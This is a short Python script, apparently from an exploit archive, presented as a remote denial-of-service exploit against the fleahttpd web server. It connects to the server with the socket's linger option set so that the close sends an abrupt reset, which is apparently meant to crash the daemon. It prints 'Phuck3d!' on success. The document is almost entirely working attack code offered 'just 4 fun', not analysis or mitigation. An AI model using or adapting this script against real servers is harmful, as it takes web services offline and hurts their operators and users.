#!/usr/bin/python

"""

FleaHttpd Remote Denial Of Service Exploit
by condis

"FleaHttpd is a http daemon written from scratch in C. When working as a 
static file server, data show that under certain condition, fleahttpd's 
speed for static file retrieving can be three times faster than Apache2"

project site (source): http://code.google.com/p/fleahttpd/source/browse/trunk/fleahttpd.c
Tested on: Linux Debian

Just 4 fun :x

"""

import sys, socket, struct

host = '127.0.0.1'
port = 80

try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
	sock.connect((host, port))
	sock.close()
	print "Phuck3d!"

except:
	print "whOoPs?!"